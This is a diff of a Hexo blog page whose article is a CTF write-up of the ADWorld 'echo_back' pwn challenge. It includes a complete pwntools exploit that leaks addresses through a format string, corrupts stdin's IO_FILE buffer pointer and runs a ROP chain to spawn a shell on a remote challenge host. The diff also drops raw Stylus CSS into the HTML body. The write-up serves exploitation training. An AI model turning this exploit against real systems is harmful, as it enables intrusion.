@@ -18,26 +18,97 @@
 
     <link rel="shortcut icon" href="/img/wang.svg">
     
-<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
 
     <script id="hexo-configurations">
     let KEEP = window.KEEP || {};
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"300px","content_max_width":"1200px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/img/wang.svg","avatar":"/img/aliwangwang.svg","font_size":null,"font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Gamer","Learner"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":false},"version":"3.5.2"};
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
   </script>
 <meta name="generator" content="Hexo 5.4.0"></head>
 
 
 <body>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
+.progress-bar-container {
+  position fixed
+  top 0
+  left 0
+  z-index $z-index-9
+  width 100%
 
-    
-</div>
+  if (hexo-config('pjax.enable') == true) {
 
+    .pjax-progress-bar {
+      position absolute
+      top 0
+      left 0
+      z-index $z-index-8
+      width 0
+      height 2px
+      background var(--pjax-progress-bar-color)
+      visibility hidden
+      opacity 0
+      transition-t("width, opacity", "0, 0", "0.1, 0.1", "linear")
+
+
+      &.show {
+        visibility visible
+        opacity 1
+      }
+    }
+
+
+    .pjax-progress-icon {
+      position absolute
+      top 0.4rem
+      right 0.3rem
+      z-index $z-index-8
+      color var(--text-color-3)
+      font-size 1.1rem
+      visibility hidden
+
+      +keep-tablet() {
+        top 0.3rem
+        right 0.2rem
+        font-size 1rem
+      }
+
+      &.show {
+        visibility visible
+      }
+    }
+  }
+
+  if (hexo-config('style.scroll.progress_bar') == true) {
+
+    .scroll-progress-bar {
+      position absolute
+      top 0
+      left 0
+      z-index $z-index-7
+      width 0
+      height $scroll-progress-bar-height
+      background var(--primary-color)
+      visibility hidden
+      transition-t("width", "0", "0.1", "linear")
+
+      &.hide {
+        display none !important
+      }
+    }
+  }
+}
 
 <main class="page-container">
 
@@ -46,13 +117,18 @@
     <div class="page-main-content">
 
         <div class="page-main-content-top">
-            <header class="header-wrapper">
+            
+<header class="header-wrapper">
 
     <div class="header-content">
         <div class="left">
             
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
             <a class="logo-title" href="/">
-                Relish the Moment
+               Relish the Moment
             </a>
         </div>
 
@@ -162,31 +238,41 @@
 
                 
                     <div class="fade-in-down-animation">
-    <div class="article-content-container">
+    <div class="post-page-container">
+        <div class="article-content-container">
 
-        <div class="article-title">
-            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (IO_FILE related)</span>
-        </div>
+            <div class="article-title">
+                <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (IO_FILE related)</span>
+            </div>
 
-        
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/img/aliwangwang.svg">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">TyeYeah</span>
-                        
-                            <span class="author-label">Lv4</span>
-                        
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/img/aliwangwang.svg">
                     </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">TyeYeah</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
         <span class="pc">2020-10-26 09:10:12</span>
         <span class="mobile">2020-10-26 09:10</span>
     </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2020-11-01 21:14:25</span>
+    </span>
+    
     
         <span class="article-categories article-meta-item">
             <i class="fas fa-folder"></i>&nbsp;
@@ -238,13 +324,13 @@
     
 </div>
 
+                        </div>
                     </div>
                 </div>
-            </div>
-        
+            
 
-        <div class="article-content markdown-body">
-            <h2 id="echo-back"><a href="#echo-back" class="headerlink" title="echo_back"></a>echo_back</h2><p>Attachment: <a href="/filehost/apcaw/echo_back.zip">echo_back.zip</a><br>Description: None</p>
+            <div class="article-content keep-markdown-body">
+                <h2 id="echo-back"><a href="#echo-back" class="headerlink" title="echo_back"></a>echo_back</h2><p>Attachment: <a href="/filehost/apcaw/echo_back.zip">echo_back.zip</a><br>Description: None</p>
 <p>It contains a format string vulnerability, and needs to attack <code>scanf</code> in <code>IO_FILE</code>.</p>
 <h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ unzip echo_back.zip</span><br><span class="line">Archive:  echo_back.zip</span><br><span class="line">  inflating: echo_back</span><br><span class="line">  inflating: libc.so.6</span><br></pre></td></tr></table></figure>
@@ -302,69 +388,81 @@
 <p>Finally we can write our payload. Exit to trigger it.</p>
 <h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Here it is:</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;echo_back&#x27;</span>)   <span class="comment"># local test</span></span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;36554&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;echo_back&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)   <span class="comment"># local test</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span>(<span class="params">name</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo_back</span>(<span class="params">sth, length=<span class="number">7</span></span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>, <span class="built_in">str</span>(length)) <span class="comment"># 7 is the max</span></span><br><span class="line">    sh.send(<span class="built_in">str</span>(sth))</span><br><span class="line"></span><br><span class="line">echo_back(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">libc_start_main_addr = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line"><span class="comment"># leak __libc_start_main for libc base</span></span><br><span class="line">libc_addr = libc_start_main_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">IO_stdin_addr = libc_addr + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">IO_buf_base = IO_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line"><span class="comment"># leak main addr for elf base</span></span><br><span class="line">echo_back(<span class="string">&#x27;%13$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x9c</span> </span><br><span class="line">elf_base = main_addr - <span class="number">0x0c6c</span></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x0d93</span></span><br><span class="line"><span class="comment"># leak old rbp to get ret addr and overwrite</span></span><br><span class="line">echo_back(<span class="string">&#x27;%12$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">res = sh.recvuntil(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">main_rbp = <span class="built_in">int</span>(res[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">main_ret = main_rbp + <span class="number">0x8</span></span><br><span class="line"><span class="comment"># next attack `scanf`</span></span><br><span class="line"><span class="comment"># overwrite lowest digit as 0</span></span><br><span class="line">set_name(p64(IO_buf_base))</span><br><span class="line">echo_back(<span class="string">&#x27;%16$hhn&#x27;</span>)</span><br><span class="line"><span class="comment"># restore other values and change __IO_buf_base </span></span><br><span class="line">payload = p64(IO_stdin_addr + <span class="number">131</span>)*<span class="number">3</span> + p64(main_ret) + p64(main_ret+<span class="number">0x8</span>*<span class="number">3</span>) </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)     <span class="comment"># error if using &#x27;sendlineafter&#x27;     </span></span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)                     <span class="comment"># but the &#x27;\n&#x27; is needed</span></span><br><span class="line"><span class="comment"># to pass if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload)-<span class="number">1</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write final payload</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">final_payload = p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,final_payload) <span class="comment"># here a seperated &#x27;\n&#x27; is also suggested</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-        </div>
+            </div>
 
-        
+            
 
-        
-            <ul class="post-tags-box">
-                
-                    <li class="tag-item">
-                        <a href="/tags/pwn/">#pwn</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/linux/">#linux</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item">
-                        <a href="/tags/io-file/">#io-file</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/pwn/">#pwn</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/linux/">#linux</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/io-file/">#io-file</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
 
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-Tcache/"
-                        >
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-Tcache/"
+                            >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
-                            <span class="title flex-center">
+                                <span class="title flex-center">
                                 <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Tcache)</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2020/10/21/2020-10-21-Fuzz-with-Boofuzz-the-Successor-to-Sulley/"
-                        >
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2020/10/21/2020-10-21-Fuzz-with-Boofuzz-the-Successor-to-Sulley/"
+                            >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">Fuzz with Boofuzz (the Successor to Sulley)</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
-                            <span class="right arrow-icon flex-center">
+                                <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
                             </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+                            </a>
+                        </div>
+                    
+                </div>
+            
 
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#echo-back"><span class="nav-number">1.</span> <span class="nav-text">echo_back</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
         
     </div>
 </div>
@@ -376,19 +474,23 @@
         </div>
 
         <div class="page-main-content-bottom">
-            <footer class="footer">
+            
+<footer class="footer">
     <div class="info-container">
         <div class="copyright-info info-item">
             &copy;
             
-              <span>2020</span>
-              -
+                <span>2020</span> -
             
-            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+            2022
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">TyeYeah</a>
+            
         </div>
         
         <div class="theme-info info-item">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
         </div>
         
         
@@ -404,8 +506,8 @@
     <ul class="tools-list">
         <!-- TOC aside toggle -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
@@ -426,10 +528,6 @@
 
         <li class="tools-item tool-font-adjust-minus flex-center">
             <i class="fas fa-search-minus"></i>
-        </li>
-
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
         </li>
 
         <li class="tools-item tool-dark-light-toggle flex-center">
@@ -461,18 +559,8 @@
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#echo-back"><span class="nav-number">1.</span> <span class="nav-text">echo_back</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
@@ -493,7 +581,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -524,14 +612,12 @@
 
 
 
+
+
     
 <script src="/js/local-search.js"></script>
 
 
-
-
-    
-<script src="/js/code-copy.js"></script>
 
 
 
@@ -540,12 +626,18 @@
 <div class="post-scripts">
     
         
-<script src="/js/left-side-toggle.js"></script>
+<script src="/js/post-helper.js"></script>
 
+        
+            
 <script src="/js/libs/anime.min.js"></script>
 
+        
+        
+            
 <script src="/js/toc.js"></script>
 
+        
     
 </div>
 
